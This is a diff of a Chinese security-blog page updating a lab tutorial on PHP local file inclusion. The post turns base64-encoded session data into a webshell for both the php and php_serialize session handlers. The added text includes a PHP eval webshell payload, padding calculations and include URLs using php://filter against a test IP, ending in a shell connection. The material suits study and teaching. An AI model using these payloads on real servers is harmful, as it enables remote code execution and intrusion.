@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>LFI Bypass Session Base64Encode Getshell · Qftm&#39;s Blog</title>
+    <title>LFI Bypass Session Base64Encode Restriction Getshell · Qftm&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >Qftm&#39;s Blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">LFI Bypass Session Base64Encode Getshell</a>
+                <a href="#" class="post-name">LFI Bypass Session Base64Encode Restriction Getshell</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            LFI Bypass Session Base64Encode Getshell
+            LFI Bypass Session Base64Encode Restriction Getshell
             <!-- 404 -->
             
         </h1>
@@ -274,7 +274,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">2.4k</span>Reading time: <span class="post-count reading-time">9 min</span></span>
+                        <span>Word count: <span class="post-count word-count">3.5k</span>Reading time: <span class="post-count reading-time">13 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -453,7 +453,7 @@ height:50vh;
 
 <p><img src="/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/1594459-20200313110552453-1553940744.png" alt></p>
 <p>意外的事情发生了，你发现解码后包含的内容竟然是乱码！！这是为什么呢？？</p>
-<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>对于上面利用<code>php://filter</code>的base64解码功能进行解码包含出现了错误，还是不能够利用成功，回过头仔细想想会发现，session存储的一部分信息是用户名base64编码后的信息，然而我们对session进行base64解码的是整个session信息，也就是说编码和解码的因果关系不对，也就导致解码的结果是乱码。</p>
+<h2 id="Bypass-serialize-handler-php"><a href="#Bypass-serialize-handler-php" class="headerlink" title="Bypass serialize_handler=php"></a>Bypass serialize_handler=php</h2><p>对于上面利用<code>php://filter</code>的base64解码功能进行解码包含出现了错误，还是不能够利用成功，回过头仔细想想会发现，session存储的一部分信息是用户名base64编码后的信息，然而我们对session进行base64解码的是整个session信息，也就是说编码和解码的因果关系不对，也就导致解码的结果是乱码。</p>
 <p>那有没有什么办法可以让base64编码和解码的因果关系对照上，答案是有的，先来了解一下base64编码的原理。</p>
 <h3 id="Base64Encode"><a href="#Base64Encode" class="headerlink" title="Base64Encode"></a>Base64Encode</h3><p>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。</p>
 <p><strong>base54索引表</strong></p>
@@ -475,19 +475,36 @@ height:50vh;
 <p><strong>base64解码过程</strong></p>
 <p> base64解码，即是base64编码的逆过程，如果理解了编码过程，解码过程也就容易理解。将base64编码数据根据编码表分别索引到编码值，然后每4个编码值一组组成一个24位的数据流，解码为3个字符。对于末尾位“=”的base64数据，最终取得的4字节数据，需要去掉“=”再进行转换。</p>
 <p>解码过程可以参考上图，逆向理解：“QUJDRA==” ——&gt;“ABCD”</p>
-<h3 id="Bypass-base64-encode"><a href="#Bypass-base64-encode" class="headerlink" title="Bypass base64_encode"></a>Bypass base64_encode</h3><p>了解了base64编码原理之后，怎么让base64解码和编码的因果关系对照上，其实就很简单了，我们只要让session文件中base64编码的前面这一部分<code>username|s:40:&quot;</code>正常解码就可以，怎么才能正常解码呢，需要满足base64解码的原理，就是4个字节能够还原原始的3个字节信息，也就是说session前面的这部分数据长度需要满足4的整数倍，如果不满足的话，就会影响session后面真正的base64编码的信息，也就导致上面出现的乱码情况。</p>
+<p><strong>base64解码特点</strong></p>
+<p>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
+<ul>
+<li>测试代码</li>
+</ul>
+<p>探测base64_decode解码的特点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Qftm</span></span><br><span class="line"><span class="comment"> * Date: 2020/3/17</span></span><br><span class="line"><span class="comment"> * Time: 9:16</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">$basestr0=<span class="string">"QftmrootQftm"</span>;</span><br><span class="line">$basestr1=<span class="string">"Qftm#root@Qftm"</span>;</span><br><span class="line">$basestr2=<span class="string">"Qftm^root&amp;Qftm"</span>;</span><br><span class="line">$basestr3=<span class="string">"Qft&gt;mro%otQftm"</span>;</span><br><span class="line">$basestr4=<span class="string">"Qf%%%tmroo%%%tQftm"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_decode($basestr0).<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_decode($basestr1).<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_decode($basestr2).<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_decode($basestr3).<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_decode($basestr4).<span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>运行结果</li>
+</ul>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/1594459-20200317092914997-1376619696.png" alt></p>
+<p>从结果中可以看到一个字符串中，不管出现多少个特殊字符或者位置差异，都不会影响最终的结果，可以验证base64_decode是遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>
+<h3 id="Bypass-base64-encode"><a href="#Bypass-base64-encode" class="headerlink" title="Bypass base64_encode"></a>Bypass base64_encode</h3><p>了解了base64编码原理之后和解码的特点，怎么让base64解码和编码的因果关系对照上，其实就很简单了，我们只要让session文件中base64编码的前面这一部分<code>username|s:40:&quot;</code>正常解码就可以，怎么才能正常解码呢，需要满足base64解码的原理，就是4个字节能够还原原始的3个字节信息，也就是说session前面的这部分数据长度需要满足4的整数倍，如果不满足的话，就会影响session后面真正的base64编码的信息，也就导致上面出现的乱码情况。</p>
 <p><strong>bypass分析判断</strong></p>
-<p>当session存储的信息中用户名编码后的长度为个位数时，<code>username|s:1:&quot;</code>这部分数据长度为14，不满足情况。</p>
-<p>4组解码-&gt;后面需占两位（<code>X</code> 代表占位符）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user name |s:1 :&quot;XX</span><br></pre></td></tr></table></figure>
+<p>解码包含serialize_handler=php处理过的原始session信息，未能正常解析执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username|s:40:&quot;PD9waHAgZXZhbCgkX1BPU1RbJ210ZnEnXSk7Pz4&#x3D;&quot;;</span><br><span class="line"></span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_qfg3alueqlubqu59l822krh5pl</span><br></pre></td></tr></table></figure>
 
-<p>当session存储的信息中用户名编码后的长度为两位数时，<code>username|s:11:&quot;</code>这部分数据长度为15，不满足情况。</p>
-<p>4组解码-&gt;后面需占一位</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user name |s:1 1:&quot;X</span><br></pre></td></tr></table></figure>
+<p><img src="https://img2020.cnblogs.com/blog/1594459/202003/1594459-20200313110552453-1553940744.png" alt></p>
+<p>依据base64编码和解码的特点进行分析，当session存储的信息中用户名编码后的长度为个位数时，<code>username|s:1:&quot;</code>这部分数据长度为14，实际解码为<code>usernames1</code>，实际长度为10，不满足情况。</p>
+<p>4组解码-&gt;缺少两个字节，后面需占两位（<code>X</code> 代表占位符）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username|s:1:&quot;  &#x2F;&#x2F;原始未处理信息</span><br><span class="line"></span><br><span class="line">user name s1XX  &#x2F;&#x2F;base64解码特点，去除特殊字符，填充两个字节&#39;XX&#39;</span><br></pre></td></tr></table></figure>
 
-<p>当session存储的信息中用户名编码后的长度为三位数时，<code>username|s:111:&quot;</code>这部分数据长度为16，满足情况。</p>
-<p>4组解码-&gt;后面需占零位</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user name |s:1 11:&quot;</span><br></pre></td></tr></table></figure>
+<p>当session存储的信息中用户名编码后的长度为两位数时，<code>username|s:11:&quot;</code>这部分数据长度为15，实际解码为<code>usernames11</code>，实际长度为11，不满足情况。</p>
+<p>4组解码-&gt;缺少一个字节，后面需占一位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username|s:11:&quot;   &#x2F;&#x2F;原始未处理信息</span><br><span class="line"></span><br><span class="line">user name s11X   &#x2F;&#x2F;base64解码特点，去除特殊字符，填充一个字节&#39;X&#39;</span><br></pre></td></tr></table></figure>
+
+<p>当session存储的信息中用户名编码后的长度为三位数时，<code>username|s:111:&quot;</code>这部分数据长度为16，实际解码为<code>usernames111</code>，长度为12，满足情况。</p>
+<p>4组解码-&gt;缺少零个字节，后面需占零位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username|s:11:&quot;   &#x2F;&#x2F;原始未处理信息</span><br><span class="line"></span><br><span class="line">user name s111  &#x2F;&#x2F;base64解码特点，去除特殊字符，填充0个字节&#39;X&#39;</span><br></pre></td></tr></table></figure>
 
 <p>这种情况下刚好满足，即使前面这部分数据正常解码后的结果是乱码，也不会影响后面恶意代码的正常解码。</p>
 <p>再次构造payload</p>
@@ -514,7 +531,49 @@ height:50vh;
 <h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>尝试蚁剑连接我们session中传入的恶意代码</p>
 <p><img src="/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/1594459-20200313122255469-468699212.png" alt></p>
 <p><img src="/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/1594459-20200313122353878-877050915.png" alt></p>
-<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>看到这里可能有人会想上面默认处理的是<code>session.serialize_handler = php</code>这种模式，那么针对<code>session.serialize_handler = php_serialize</code>这种处理方式呢，答案是一样的，只要能构造出相应的<code>payload</code>满足恶意代码的正常解码就可以。</p>
+<h2 id="Bypass-serialize-handler-php-serialize"><a href="#Bypass-serialize-handler-php-serialize" class="headerlink" title="Bypass serialize_handler=php_serialize"></a>Bypass serialize_handler=php_serialize</h2><p>看到这里可能有人会想上面默认处理的是<code>session.serialize_handler = php</code>这种模式，那么针对<code>session.serialize_handler = php_serialize</code>这种处理方式呢，答案是一样的，只要能构造出相应的<code>payload</code>满足恶意代码的正常解码就可以。</p>
+<h3 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h3><p><strong>session.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	</span><br><span class="line">    ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);	</span><br><span class="line">	session_start();</span><br><span class="line">	$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">	$_SESSION[<span class="string">'username'</span>] = base64_encode($username);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"username -&gt; $username"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="bypass分析"><a href="#bypass分析" class="headerlink" title="bypass分析"></a>bypass分析</h3><p>解码包含serialize_handler=php_serialize处理过的原始session信息，未能正常解析执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:8:&quot;username&quot;;s:40:&quot;PD9waHAgZXZhbCgkX1BPU1RbJ210ZnEnXSk7Pz4&#x3D;&quot;;&#125;</span><br><span class="line"></span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_7qefqgu07pluu38m45isiesq3s</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/1594459-20200317101833462-2143950751.png" alt></p>
+<p>依据base64编码和解码的特点进行分析，当session存储的信息中用户名编码后的长度为个位数时，<code>a:1:{s:8:&quot;username&quot;;s:1:&quot;</code>这部分数据长度为25，实际解码为<code>a1s8usernames1</code>，实际长度为14，不满足情况。</p>
+<p>4组解码-&gt;缺少两个字节，后面需占两位（<code>X</code> 代表占位符）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:8:&quot;username&quot;;s:1:&quot;  &#x2F;&#x2F;原始未处理信息</span><br><span class="line"></span><br><span class="line">a1s8 user name s1XX  &#x2F;&#x2F;base64解码特点，去除特殊字符，填充两个字节&#39;XX&#39;</span><br></pre></td></tr></table></figure>
+
+<p>当session存储的信息中用户名编码后的长度为两位数时，<code>a:1:{s:8:&quot;username&quot;;s:11:&quot;</code>这部分数据长度为26，实际解码为<code>a1s8usernames11</code>，实际长度为15，不满足情况。</p>
+<p>4组解码-&gt;缺少一个字节，后面需占一位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:8:&quot;username&quot;;s:11:&quot;   &#x2F;&#x2F;原始未处理信息</span><br><span class="line"></span><br><span class="line">a1s8 user name s11X   &#x2F;&#x2F;base64解码特点，去除特殊字符，填充一个字节&#39;X&#39;</span><br></pre></td></tr></table></figure>
+
+<p>当session存储的信息中用户名编码后的长度为三位数时，<code>a:1:{s:8:&quot;username&quot;;s:11:&quot;</code>这部分数据长度为27，实际解码为<code>a1s8usernames111</code>，长度为16，满足情况。</p>
+<p>4组解码-&gt;缺少零个字节，后面需占零位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:8:&quot;username&quot;;s:111:&quot;  &#x2F;&#x2F;原始未处理信息</span><br><span class="line"></span><br><span class="line">a1s8 user name s111  &#x2F;&#x2F;base64解码特点，去除特殊字符，填充0个字节&#39;X&#39;</span><br></pre></td></tr></table></figure>
+
+<p>这种情况下刚好满足，即使前面这部分数据正常解码后的结果是乱码，也不会影响后面恶意代码的正常解码。</p>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST：</span><br><span class="line">username&#x3D;qftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftm&lt;?php eval($_POST[&#39;mtfq&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先测试payload编码后的长度是否满足</p>
+<p>base64编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtcWZ0bXFmdG1xZnRtPD9waHAgZXZhbCgkX1BPU1RbJ210ZnEnXSk7Pz4&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2020.cnblogs.com/blog/1594459/202003/1594459-20200313121223649-58947131.png" alt></p>
+<p>编码测长</p>
+<p><img src="https://img2020.cnblogs.com/blog/1594459/202003/1594459-20200313121356731-1397855559.png" alt></p>
+<p>可以看到满足长度需求</p>
+<h3 id="bypass利用"><a href="#bypass利用" class="headerlink" title="bypass利用"></a>bypass利用</h3><p>构造payload传入恶意session</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.33.6.145&#x2F;FI&#x2F;session&#x2F;session.php</span><br><span class="line"></span><br><span class="line">POST：</span><br><span class="line">username&#x3D;qftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftmqftm&lt;?php eval($_POST[&#39;mtfq&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2020.cnblogs.com/blog/1594459/202003/1594459-20200313121822051-1296620878.png" alt></p>
+<p>构造payload包含恶意session</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.33.6.145&#x2F;FI&#x2F;session&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_7qefqgu07pluu38m45isiesq3s</span><br><span class="line"></span><br><span class="line">POST：</span><br><span class="line">mtfq&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/1594459-20200317101949704-511310304.png" alt></p>
+<p>从相应结果中可以看到，我们这次构造的payload成功解析了，达到了预期的目的。</p>
+<h3 id="Getshell-1"><a href="#Getshell-1" class="headerlink" title="Getshell"></a>Getshell</h3><p>尝试蚁剑连接我们session中传入的恶意代码</p>
+<p><img src="/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/1594459-20200317102251456-1356737447.png" alt></p>
 
     </article>
     <!-- license  -->
@@ -523,7 +582,7 @@ height:50vh;
             <p>Author：<a href="http://Qftm.github.io">Qftm</a>
             <p>原文链接：<a href="http://qftm.github.io/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/">http://qftm.github.io/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/</a>
             <p>发表日期：<a href="http://qftm.github.io/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/">March 12th 2020, 3:20:00 pm</a>
-            <p>更新日期：<a href="http://qftm.github.io/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/">March 14th 2020, 11:04:00 pm</a>
+            <p>更新日期：<a href="http://qftm.github.io/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/">March 17th 2020, 10:43:40 am</a>
             <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -668,7 +727,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#用户会话"><span class="toc-number">2.</span> <span class="toc-text">用户会话</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#会话存储"><span class="toc-number">2.1.</span> <span class="toc-text">会话存储</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#会话处理"><span class="toc-number">2.2.</span> <span class="toc-text">会话处理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Session-Base64Encode"><span class="toc-number">3.</span> <span class="toc-text">Session Base64Encode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#测试代码"><span class="toc-number">3.1.</span> <span class="toc-text">测试代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常规利用"><span class="toc-number">3.2.</span> <span class="toc-text">常规利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-number">3.3.</span> <span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Base64Encode"><span class="toc-number">3.3.1.</span> <span class="toc-text">Base64Encode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-base64-encode"><span class="toc-number">3.3.2.</span> <span class="toc-text">Bypass base64_encode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getshell"><span class="toc-number">3.3.3.</span> <span class="toc-text">Getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#最后"><span class="toc-number">3.3.4.</span> <span class="toc-text">最后</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#用户会话"><span class="toc-number">2.</span> <span class="toc-text">用户会话</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#会话存储"><span class="toc-number">2.1.</span> <span class="toc-text">会话存储</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#会话处理"><span class="toc-number">2.2.</span> <span class="toc-text">会话处理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Session-Base64Encode"><span class="toc-number">3.</span> <span class="toc-text">Session Base64Encode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#测试代码"><span class="toc-number">3.1.</span> <span class="toc-text">测试代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常规利用"><span class="toc-number">3.2.</span> <span class="toc-text">常规利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-serialize-handler-php"><span class="toc-number">3.3.</span> <span class="toc-text">Bypass serialize_handler&#x3D;php</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Base64Encode"><span class="toc-number">3.3.1.</span> <span class="toc-text">Base64Encode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-base64-encode"><span class="toc-number">3.3.2.</span> <span class="toc-text">Bypass base64_encode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getshell"><span class="toc-number">3.3.3.</span> <span class="toc-text">Getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-serialize-handler-php-serialize"><span class="toc-number">3.4.</span> <span class="toc-text">Bypass serialize_handler&#x3D;php_serialize</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#测试代码-1"><span class="toc-number">3.4.1.</span> <span class="toc-text">测试代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass分析"><span class="toc-number">3.4.2.</span> <span class="toc-text">bypass分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass利用"><span class="toc-number">3.4.3.</span> <span class="toc-text">bypass利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getshell-1"><span class="toc-number">3.4.4.</span> <span class="toc-text">Getshell</span></a></li></ol></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -681,6 +740,14 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -1787,7 +1854,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/" >LFI Bypass Session Base64Encode Getshell</a>
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href= "/2020/03/12/LFI-Bypass-Session-Base64Encode-Getshell/" >LFI Bypass Session Base64Encode Restriction Getshell</a>
         </li>
     
     
@@ -2120,12 +2187,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/10</span><a class="archive-post-title" href= "/2018/06/10/msf%E7%99%BB%E9%99%86Windows-2/" >MSF 登陆Windows 2</a>
+            <span class="archive-post-date">06/10</span><a class="archive-post-title" href= "/2018/06/10/msf%E7%99%BB%E9%99%86Windows-1/" >MSF 登陆Windows 1</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/10</span><a class="archive-post-title" href= "/2018/06/10/msf%E7%99%BB%E9%99%86Windows-1/" >MSF 登陆Windows 1</a>
+            <span class="archive-post-date">06/10</span><a class="archive-post-title" href= "/2018/06/10/msf%E7%99%BB%E9%99%86Windows-2/" >MSF 登陆Windows 2</a>
         </li>
     
     
@@ -2190,19 +2257,19 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="CSRF"><span class="iconfont-archer">&#xe606;</span>CSRF</span>
     
-        <span class="sidebar-tag-name" data-tags="数据结构"><span class="iconfont-archer">&#xe606;</span>数据结构</span>
-    
         <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
     
         <span class="sidebar-tag-name" data-tags="CMS"><span class="iconfont-archer">&#xe606;</span>CMS</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞挖掘"><span class="iconfont-archer">&#xe606;</span>漏洞挖掘</span>
     
-        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+        <span class="sidebar-tag-name" data-tags="数据结构"><span class="iconfont-archer">&#xe606;</span>数据结构</span>
     
         <span class="sidebar-tag-name" data-tags="MacOS"><span class="iconfont-archer">&#xe606;</span>MacOS</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
         <span class="sidebar-tag-name" data-tags="LFI"><span class="iconfont-archer">&#xe606;</span>LFI</span>
     
@@ -2214,15 +2281,17 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
     
+        <span class="sidebar-tag-name" data-tags="后门分析"><span class="iconfont-archer">&#xe606;</span>后门分析</span>
+    
         <span class="sidebar-tag-name" data-tags="RFI"><span class="iconfont-archer">&#xe606;</span>RFI</span>
     
         <span class="sidebar-tag-name" data-tags="SQLInjection"><span class="iconfont-archer">&#xe606;</span>SQLInjection</span>
     
-        <span class="sidebar-tag-name" data-tags="后门分析"><span class="iconfont-archer">&#xe606;</span>后门分析</span>
-    
-        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
     
         <span class="sidebar-tag-name" data-tags="PowerShell"><span class="iconfont-archer">&#xe606;</span>PowerShell</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
     
         <span class="sidebar-tag-name" data-tags="MSF"><span class="iconfont-archer">&#xe606;</span>MSF</span>
     
@@ -2244,11 +2313,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="电子取证"><span class="iconfont-archer">&#xe606;</span>电子取证</span>
     
-        <span class="sidebar-tag-name" data-tags="路由协议"><span class="iconfont-archer">&#xe606;</span>路由协议</span>
-    
         <span class="sidebar-tag-name" data-tags="HTTP"><span class="iconfont-archer">&#xe606;</span>HTTP</span>
     
-        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+        <span class="sidebar-tag-name" data-tags="路由协议"><span class="iconfont-archer">&#xe606;</span>路由协议</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -2295,11 +2362,11 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="Web"><span class="iconfont-archer">&#xe60a;</span>Web</span>
     
-        <span class="sidebar-category-name" data-categories="算法艺术"><span class="iconfont-archer">&#xe60a;</span>算法艺术</span>
-    
         <span class="sidebar-category-name" data-categories="运维"><span class="iconfont-archer">&#xe60a;</span>运维</span>
     
         <span class="sidebar-category-name" data-categories="漏洞挖掘"><span class="iconfont-archer">&#xe60a;</span>漏洞挖掘</span>
+    
